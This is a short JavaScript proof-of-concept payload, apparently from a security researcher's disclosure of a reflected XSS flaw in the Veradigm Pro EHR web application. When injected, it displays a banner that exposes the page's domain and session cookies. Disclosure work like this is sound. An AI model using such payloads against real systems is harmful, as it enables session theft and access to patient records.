// Veradigm Pro EHR - Reflected XSS PoC
// Researcher: 0xpa1
// This script proves arbitrary JavaScript execution in the veradigmcloud.com origin
(function(){
  var b = document.createElement('div');
  b.setAttribute('style','position:fixed;top:0;left:0;width:100%;padding:20px;background:#c0392b;color:#fff;font-size:20px;z-index:999999;text-align:center;font-family:monospace');
  b.textContent = 'XSS PoC by 0xpa1 | Domain: ' + document.domain + ' | Cookies: ' + document.cookie;
  (document.body || document.documentElement).appendChild(b);
  document.title = 'XSS - ' + document.domain;
})();
